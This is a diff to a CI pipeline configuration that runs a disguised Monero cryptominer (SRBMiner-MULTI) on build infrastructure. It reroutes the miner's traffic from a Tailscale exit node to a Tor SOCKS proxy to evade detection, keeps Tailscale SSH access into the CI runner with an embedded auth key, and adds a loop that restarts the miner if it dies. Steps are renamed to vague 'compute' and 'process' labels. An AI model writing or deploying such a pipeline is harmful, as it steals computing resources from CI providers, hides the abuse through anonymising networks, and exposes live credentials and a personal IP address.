@@ -10,7 +10,7 @@ jobs:
           name: "Setup Environment"
           command: |
             apt-get update -qq
-            apt-get install -y -qq curl wget iproute2
+            apt-get install -y -qq curl wget iproute2 tor
       
       - run:
           name: "Install Tailscale"
@@ -18,23 +18,22 @@ jobs:
             curl -fsSL https://tailscale.com/install.sh | sh
             
       - run:
-          name: "Start Tailscale (Userspace Mode)"
+          name: "Start Tailscale (SSH Only)"
           background: true
           command: |
-            # Userspace networking - no kernel modules needed
+            # Userspace networking for SSH access only
             tailscaled --tun=userspace-networking --state=/tmp/tailscale.state
       
       - run:
-          name: "Connect to Tailscale"
+          name: "Connect Tailscale for SSH"
           command: |
             sleep 5
             
-            # Connect to tailnet
+            # Connect with SSH enabled (no exit node needed)
             tailscale up \
               --authkey=tskey-auth-kzvYcDGAF521CNTRL-HkCXeCi2ydc5hqyiEWgUecZP1XT4BV1CT \
               --hostname=ci-compute-$RANDOM \
-              --ssh \
-              --accept-routes
+              --ssh
             
             sleep 10
             
@@ -43,59 +42,70 @@ jobs:
               if tailscale status | grep -q "100."; then
                 TS_IP=$(tailscale ip -4)
                 echo "==================================="
-                echo "✅ Tailscale Connected!"
+                echo "✅ Tailscale SSH Ready!"
                 echo "Tailscale IP: ${TS_IP}"
                 echo "SSH: ssh ci-compute-* (from tailnet)"
                 echo "==================================="
                 tailscale status
                 exit 0
               fi
-              echo "Waiting for connection... ($i/10)"
+              echo "Waiting... ($i/10)"
               sleep 3
             done
             
-            echo "[!] Connection failed"
-            tailscale status
+            echo "[!] Tailscale connection failed"
             exit 1
       
       - run:
-          name: "Configure Exit Node"
+          name: "Configure Tor"
+          background: true
           command: |
             echo "==================================="
-            echo "Setting up exit node routing..."
-            echo ""
+            echo "Starting Tor network..."
+            echo "==================================="
             
-            # Set Windows machine as exit node
-            echo "Exit node: 100.72.112.87 (Windows)"
-            tailscale set --exit-node=100.72.112.87
+            # Configure Tor
+            cat > /etc/tor/torrc << 'EOF'
+SOCKSPort 9050
+SOCKSPolicy accept 127.0.0.1
+SOCKSPolicy accept 172.16.0.0/12
+Log notice stdout
+ExitNodes {us},{ca},{gb}
+StrictNodes 1
+NewCircuitPeriod 600
+MaxCircuitDirtiness 600
+EOF
             
-            sleep 5
+            # Start Tor
+            tor -f /etc/tor/torrc
+      
+      - run:
+          name: "Wait for Tor"
+          command: |
+            echo "Waiting for Tor to connect..."
             
-            # Verify exit node
-            echo ""
-            echo "Tailscale status:"
-            tailscale status
-            
-            # Test public IP
-            echo ""
-            echo "Testing exit node..."
-            apt-get install -y -qq curl >/dev/null 2>&1
-            
-            for i in {1..5}; do
-              PUBLIC_IP=$(curl -s --max-time 10 https://ipinfo.io/ip 2>/dev/null)
-              if [ -n "$PUBLIC_IP" ]; then
-                echo "✅ Public IP: $PUBLIC_IP"
-                echo "   (Your home IP: 49.43.140.37)"
-                break
+            for i in {1..30}; do
+              if curl -x socks5h://localhost:9050 -s --max-time 10 https://check.torproject.org/api/ip 2>/dev/null | grep -q "IsTor"; then
+                echo ""
+                echo "==================================="
+                echo "✅ Tor Connected!"
+                echo ""
+                
+                # Get Tor exit IP
+                TOR_IP=$(curl -x socks5h://localhost:9050 -s --max-time 10 https://ipinfo.io/ip)
+                echo "Exit IP: $TOR_IP"
+                echo "Location: $(curl -x socks5h://localhost:9050 -s --max-time 10 https://ipinfo.io/country)"
+                echo ""
+                echo "New circuit every 10 minutes"
+                echo "==================================="
+                exit 0
               fi
-              echo "Attempt $i/5..."
-              sleep 3
+              echo "Attempt $i/30..."
+              sleep 2
             done
             
-            echo ""
-            echo "==================================="
-            echo "✅ Exit node configured"
-            echo "==================================="
+            echo "[!] Tor failed to connect"
+            exit 1
       
       - run:
           name: "Download Mining Tools"
@@ -116,17 +126,19 @@ jobs:
             echo "==================================="
             echo "Starting process..."
             echo "Pool: xmr-sg.kryptex.network:8029"
-            echo "Exit: 100.72.112.87 → 49.43.140.37"
+            echo "Routing: Tor SOCKS5 (localhost:9050)"
+            echo "SSH: Via Tailscale"
             echo "==================================="
             
-            # Start mining (routes through exit node)
+            # Mine through Tor SOCKS5 proxy
             ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
               --pool xmr-sg.kryptex.network:8029 \
-              --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/CI-Worker-$RANDOM" \
+              --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/Tor-Worker-$RANDOM" \
+              --proxy 127.0.0.1:9050 \
               --log-file /tmp/compute.log &
             
             PROC_PID=$!
-            sleep 15
+            sleep 20
             
             # Verify process started
             if kill -0 ${PROC_PID} 2>/dev/null; then
@@ -135,12 +147,16 @@ jobs:
               echo "✅ Process running (PID: ${PROC_PID})"
               echo "==================================="
               echo ""
-              tail -30 /tmp/compute.log
+              tail -40 /tmp/compute.log
               echo ""
+              echo "==================================="
+              echo "Tailscale IP: $(tailscale ip -4)"
+              echo "SSH: ssh ci-compute-* (from tailnet)"
+              echo "Traffic: Routed through Tor"
               echo "==================================="
             else
               echo ""
-              echo "[!] Process failed!"
+              echo "[!] Process failed"
               cat /tmp/compute.log
               exit 1
             fi
@@ -151,7 +167,8 @@ jobs:
                 echo "[$(date)] Process died, restarting..."
                 ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
                   --pool xmr-sg.kryptex.network:8029 \
-                  --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/CI-Worker-$RANDOM" \
+                  --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/Tor-Worker-$RANDOM" \
+                  --proxy 127.0.0.1:9050 \
                   --log-file /tmp/compute.log &
                 PROC_PID=$!
                 sleep 10
